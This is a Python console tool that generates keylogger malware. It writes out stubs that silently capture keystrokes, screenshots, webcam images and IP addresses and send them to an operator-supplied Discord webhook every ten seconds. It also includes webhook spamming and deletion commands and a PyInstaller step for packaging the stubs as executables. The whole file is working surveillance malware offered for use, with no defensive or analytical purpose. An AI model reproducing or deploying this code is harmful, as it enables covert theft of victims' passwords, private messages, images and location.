import os
import requests
import aiohttp
import asyncio
import shutil

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

class Silent_KeyLogger:
    def __init__(self):
        pass

    def run(self):
        mlwr_folder = "Malware"
        os.makedirs(mlwr_folder, exist_ok=True)
        filename = os.path.join(mlwr_folder, "discord_keylogger.pyw")
        print("Program is asking for a webhook")
        self.webhook_raw = input("console//: ")
        webhook = self.webhook_raw.strip()
        with open(filename, "w") as f:
            stub = f"""
import aiohttp
from pynput import keyboard
import asyncio


class Execution:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("{webhook}", json=self.json):
                pass

    async def send_data(self):
            self.json = {{
                "content": f"```{{self.text}}```"
            }}
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            await asyncio.sleep(10)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\\n{{key}}"
            

    async def run(self):
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()


if __name__ == '__main__':
    execution = Execution()
    asyncio.run(execution.run())

    """
            f.write(stub)
            input(f"Keylogger created at {filename}... Press Enter to continue...")

class keylogger:
    def __init__(self):
        pass
    def run(self):
        mlwr_folder = "Malware"
        os.makedirs(mlwr_folder, exist_ok=True)
        filename = os.path.join(mlwr_folder, "keylogger.pyw")
        print("Program is asking for a webhook")
        self.webhook_raw = input("console//: ")
        webhook = self.webhook_raw.strip()
        with open(filename, "w") as f:
            stub = f"""
import aiohttp
from pynput import keyboard
import asyncio
import pyautogui
import os
import cv2
import socket
import requests
import shutil

folder = "contents"
os.makedirs(folder, exist_ok=True)

class KeyLogger:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("{webhook}", json=self.json):
                pass

    async def send_data(self):
            self.json = {{"content": f"{{self.text}}"}}
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            await asyncio.sleep(10)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\\n{{key}}"
        except None:
            pass
            

    async def run(self):
        requests.post("{webhook}", json={{"content": "Keylogger started successfully."}})
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()

def take_screenshot():
    filename = os.path.join(folder, "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def camera_capture():
    if not cv2.VideoCapture(0).isOpened():
        return None
    filename = os.path.join(folder, "camera_capture.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
    cam.release()
    return filename

def send_data_dc():
    async def start():
        screenshot  = take_screenshot()
        camera_img = camera_capture()
        media = [screenshot, camera_img]
        public_ip, local_ip = ip_grabber()
        ip_msg = f"Public IP >> {{public_ip}}\\nLocal IP >> {{local_ip}}"
        ip_msg_payload = {{
            "content": f"```{{ip_msg}}```"
        }}
        async with aiohttp.ClientSession() as sack:
            webhook_url = "{webhook}"
            for file_path in media:
                if file_path and os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        form = aiohttp.FormData()
                        form.add_field('file', f, filename=os.path.basename(file_path))
                        await sack.post(webhook_url, data=form)
            await sack.post(webhook_url, json=ip_msg_payload)
            shutil.rmtree(folder)
    asyncio.run(start())

def ip_grabber():
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        public_ip = "None"
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "None"

    return public_ip, local_ip


if __name__ == '__main__':
    take_screenshot()
    camera_capture()
    ip_grabber()
    send_data_dc()
    keylogger = KeyLogger()
    asyncio.run(keylogger.run())

"""
            f.write(stub)
            input(f"Keylogger created at {filename}... Press Enter to continue...")

class wbh:
    def __init__(self):
        pass

    def wbh_info(self):
        print("Program is asking for a webhook")
        webhook_raw = input("console//: ")
        webhook = webhook_raw.strip()
        r = requests.get(webhook)
        if r.status_code in [200, 201, 202, 204]:
            print(f"Webhook is valid: {webhook}")
            data = r.json()
            for key, value in data.items():
                print(f"{key} >> {value}")
        else:
            print("Invalid webhook URL.")

    def wbh_s(self):
        print("Program is asking for a webhook")
        webhook_raw = input("console//: ")
        webhook = webhook_raw.strip()
        print("Program is asking for a message to send")
        message = input("console//: ")
        payload = {"content": message}
        r = requests.post(webhook, json=payload)
        if r.status_code in [200, 201, 202, 204]:
            input("Message sent successfully... Press Enter to continue...")
        else:
            input("Failed to send message... Press Enter to continue...")

    def wbh_sp(self):
        try:
            print("Program is asking for a webhook")
            webhook_raw = input("console//: ")
            webhook = webhook_raw.strip()
            print("Program is asking for text to spam")
            text = input("console//: ")
            print("Program is asking for number of times to spam")
            times = int(input("console//: "))
            payload = {"content": text}
            async def spam_loop():
                async with aiohttp.ClientSession() as sack:
                    for i in range(times):
                        s = await sack.post(webhook, json=payload)
                        if s.status not in [200, 201, 202, 204]:
                            input("Failed to send message... Press Enter to continue...")
                        else:
                            print(f"-{i+1}- Message sent successfully.")
                    input("Spamming completed... Press Enter to continue...")
            asyncio.run(spam_loop())
        except ValueError:
            input("Invalid number entered... Press Enter to continue...")
        except Exception as e:
            input(f"An error occurred: {e}... Press Enter to continue...")

    def wbh_delete(self):
        print("Program is asking for a webhook to delete")
        webhook_raw = input("console//: ")
        webhook = webhook_raw.strip()
        r = requests.delete(webhook)
        if r.status_code in [200, 201, 202, 204]:
            input("Webhook deleted successfully... Press Enter to continue...")
        else:
            input("Failed to delete webhook... Press Enter to continue...")

def py2exe():
    os.makedirs("EXE", exist_ok=True)
    print("Program is asking for a python file path")
    file_path_raw = input("console//: ")
    file_path = file_path_raw.strip()
    if not os.path.isfile(file_path):
        input("File does not exist... Press Enter to continue...")
        return
    print("Program is asking if you want a icon (y/n)")
    icon_choice = input("console//: ").lower().strip('"')
    if icon_choice == "y":
        print("Program is asking for icon file path")
        icon_path_raw = input("console//: ")
        icon_path = icon_path_raw.strip('"')
        if not os.path.isfile(icon_path):
            input("Icon file does not exist... Press Enter to continue...")
            return
        os.system(f'pyinstaller --onefile --distpath="EXE" --icon="{icon_path}" "{file_path}"')
    else:
        os.system(f'pyinstaller --onefile --distpath="EXE" "{file_path}"')
    shutil.rmtree("build")
    os.remove(f"{os.path.splitext(os.path.basename(file_path))[0]}.spec")

def help():
    help_message = """
(!! HELP FUNCTION TRIGGERED !!)

wbh stands for "webhook"
The Following lines of text are commands for "console//:"


----------DISCORD TOOLS----------

wbh silent_keylogger - Creates a discord keylogger that sends keystrokes every 10 seconds without notification.
wbh keylogger - Creates a discord keylogger that takes screenshots and camera captures.
wbh s - Sends a single message to a specified webhook.
wbh sp - Spams a specified webhook with a specified message a specified number of times.
wbh delete - Deletes a specified webhook.
wbh info - Retrieves information about a specified webhook.

----------PY2EXE TOOL----------
py2exe - Converts a specified python file into an executable using pyinstaller.
"""
    print(help_message)
    input("\nPress Enter to Leave...")
    main()

def main():
    clear()
    option_raw = input("console//: ")
    option = option_raw.lower().strip()
    if option == "help":
        help()
    elif option == "wbh silent_keylogger":
        keylogger_execute = Silent_KeyLogger()
        keylogger_execute.run()
    elif option == "wbh keylogger":
        keylogger_execute = keylogger()
        keylogger_execute.run()
    elif option == "wbh s":
        wbh_s_exec = wbh()
        wbh_s_exec.wbh_s()
    elif option == "wbh sp":
        wbh_sp_exec = wbh()
        wbh_sp_exec.wbh_sp()
    elif option == "wbh delete":
        wbh_delete_exec = wbh()
        wbh_delete_exec.wbh_delete()
    elif option == "wbh info":
        wbh_info_exec = wbh()
        wbh_info_exec.wbh_info()
    elif option == "exit":
        exit()
    elif option == "py2exe":
        py2exe()
    else:
        print("Invalid command.")
        input("Press Enter to continue...")
        main()

while True:
    main()